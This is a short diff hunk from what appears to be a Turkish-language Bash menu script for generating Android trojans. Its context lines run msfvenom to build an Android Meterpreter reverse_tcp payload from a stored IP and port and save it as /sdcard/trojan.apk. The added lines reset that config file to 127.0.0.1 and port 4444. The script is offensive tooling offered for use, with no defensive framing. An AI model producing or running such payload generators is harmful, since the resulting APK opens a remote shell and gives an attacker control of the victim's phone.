@@ -103,6 +103,8 @@ elif [[ $secim == 2 ]];then
 			port=$(sed -n 3p ağ.txt)
 			printf "\e[32m"
 			msfvenom -p android/meterpreter/reverse_tcp LHOST=$ip LPORT=$port R > /sdcard/trojan.apk
+			echo -e "127.0.0.1" > ağ.txt
+			echo -e "4444" >> ağ.txt
 			echo
 			echo
 			echo
